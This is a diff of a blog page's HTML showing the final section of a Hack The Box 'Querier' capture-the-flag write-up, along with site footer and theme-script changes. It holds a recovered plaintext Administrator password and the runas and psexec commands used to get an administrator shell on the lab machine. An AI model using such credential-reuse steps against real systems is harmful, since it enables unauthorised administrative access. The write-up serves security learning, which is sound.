-<h4 id="now-we-can-use-psexec-to-get-a-shell-as-administrator-i-used-runas-to-start-cmd-as-querieradministrator-then-i-used-psexec-">Now we can use <code class="highlighter-rouge">psexec</code> to get a shell as Administrator. I used <code class="highlighter-rouge">runas</code> to start <code class="highlighter-rouge">cmd</code> as <code class="highlighter-rouge">QUERIER\Administrator</code> then I used <code class="highlighter-rouge">psexec</code> :</h4>
-<p><code class="highlighter-rouge">runas /netonly /user:QUERIER\Administrator cmd.exe</code>
+<img src="/images/hackthebox/querier-2/25.png" alt="" />
+<br /> It also decrypts the password which is nice. Password : <code class="highlighter-rouge">MyUnclesAreMarioAndLuigi!!1!</code>
+<br /> Now we can use <code class="highlighter-rouge">psexec</code> to get a shell as Administrator. I used <code class="highlighter-rouge">runas</code> to start <code class="highlighter-rouge">cmd</code> as <code class="highlighter-rouge">QUERIER\Administrator</code> then I used <code class="highlighter-rouge">psexec</code> :
+<code class="highlighter-rouge">runas /netonly /user:QUERIER\Administrator cmd.exe</code>
 <br />
 <br />
 <code class="highlighter-rouge">psexec \\querier.htb cmd</code>
-<img src="/images/hackthebox/querier-2/26.png" alt="" /></p>
-<h4 id="and-we-owned-root-">And we owned root !</h4>
-<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
-<h4 id="dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-ahm3d_h3sham">Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a></h4>
-<h4 id="thanks-for-reading">Thanks for reading.</h4>
-<p><br />
-<br /></p>
-<h4 id="first-write-up--hack-the-box---querier">First write-up : <a href="/hack-the-box/querier">Hack The Box - Querier</a></h4>
-<h4 id="previous-hack-the-box-write-up--hack-the-box---flujab">Previous Hack The Box write-up : <a href="/hack-the-box/flujab/">Hack The Box - Flujab</a></h4>
-<h4 id="next-hack-the-box-write-up--hack-the-box---netmon">Next Hack The Box write-up : <a href="/hack-the-box/netmon/">Hack The Box - Netmon</a></h4>
+<img src="/images/hackthebox/querier-2/26.png" alt="" />
+<br /> And we owned root !
+<br /> That’s it , Feedback is appreciated !
+<br /> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
+<br /> Thanks for reading.
+<br />
+<br />
+<br /> First write-up : <a href="/hack-the-box/querier">Hack The Box - Querier</a>
+<br /> Previous Hack The Box write-up : <a href="/hack-the-box/flujab/">Hack The Box - Flujab</a>
+<br /> Next Hack The Box write-up : <a href="/hack-the-box/netmon/">Hack The Box - Netmon</a></p>
 <hr />
 
 
-  </div>
-<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/hack-the-box/querier-2/" hidden></a>
-</article>
-
-      </div>
-    </main><footer class="site-footer h-card">
-  <data class="u-url" href="/"></data>
-
-  <div class="wrapper">
-
-    <h2 class="footer-heading">0xRick Owned Root !</h2>
-
-    <div class="footer-col-wrapper">
-      <div class="footer-col footer-col-1">
-        <ul class="contact-list">
-          <li class="p-name">0xRick Owned Root !</li></ul>
-      </div>
-
-      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
 </div>
 
-      <div class="footer-col footer-col-3">
-        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
+
+
+
+
+<div class="related">
+  <h2>other posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/pwn/collision/">
+            pwnable.kr - collision
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/unattended/">
+            Hack The Box - Unattended
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/helpline/">
+            Hack The Box - Helpline
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/active-directory/" class="set-1">active-directory</a> <a href="/tag/binary-exploitation/" class="set-3">binary-exploitation</a> <a href="/tag/bsd/" class="set-1">bsd</a> <a href="/tag/buffer-overflow/" class="set-2">buffer-overflow</a> <a href="/tag/c/" class="set-2">c</a> <a href="/tag/code-analysis/" class="set-1">code-analysis</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/drupal/" class="set-1">drupal</a> <a href="/tag/egghunting/" class="set-1">egghunting</a> <a href="/tag/exploit-development/" class="set-1">exploit development</a> <a href="/tag/exploit-development/" class="set-2">exploit-development</a> <a href="/tag/firewall/" class="set-1">firewall</a> <a href="/tag/forensics/" class="set-1">forensics</a> <a href="/tag/ftp/" class="set-1">ftp</a> <a href="/tag/joomla/" class="set-1">joomla</a> <a href="/tag/latex-injection/" class="set-1">latex-injection</a> <a href="/tag/ldap/" class="set-1">ldap</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/networking/" class="set-2">networking</a> <a href="/tag/php/" class="set-2">php</a> <a href="/tag/pivoting/" class="set-1">pivoting</a> <a href="/tag/python/" class="set-3">python</a> <a href="/tag/rbash/" class="set-1">rbash</a> <a href="/tag/rce/" class="set-5">rce</a> <a href="/tag/reverse-engineering/" class="set-1">reverse-engineering</a> <a href="/tag/smb/" class="set-2">smb</a> <a href="/tag/snmp/" class="set-1">snmp</a> <a href="/tag/sqli/" class="set-1">sqli</a> <a href="/tag/ssh/" class="set-3">ssh</a> <a href="/tag/ssti/" class="set-1">ssti</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/web/" class="set-5">web</a> <a href="/tag/windows/" class="set-3">windows</a> <a href="/tag/windows-exploitation/" class="set-1">windows-exploitation</a> <a href="/tag/wordpress/" class="set-1">wordpress</a></div>
+  
+
+
+
       </div>
-    </div>
+    </main><footer class="site-footer">
+	<center> <script src="https://www.hackthebox.eu/badge/65598"></script> </center>
+  <div class="wrapper"><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+if (theme === "dark") {
+	document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
 
+if (theme === "dark") {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+} else if (theme === "light") {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+} else if  (userPrefers === "dark") {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'dark');
+	document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	window.localStorage.setItem('theme', 'dark');
+	document.getElementById("theme-toggle").className = 'light';
+} else {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'light');
+	document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	window.localStorage.setItem('theme', 'light');
+	document.getElementById("theme-toggle").className = 'dark';
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    document.documentElement.setAttribute('data-theme', 'light');
+		document.documentElement.classList.add('theme--light');
+        document.documentElement.classList.remove('theme--dark');
+		window.localStorage.setItem('theme', 'light');
+	    document.getElementById("theme-toggle").className = 'dark';
+	} else {
+	    document.documentElement.setAttribute('data-theme', 'dark');
+		document.documentElement.classList.add('theme--dark');
+        document.documentElement.classList.remove('theme--light');
+		window.localStorage.setItem('theme', 'dark');
+	    document.getElementById("theme-toggle").className = 'light';
+	}
+}
+</script></div>
   </div>
-
 </footer>
-</body>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
 
 </html>
-
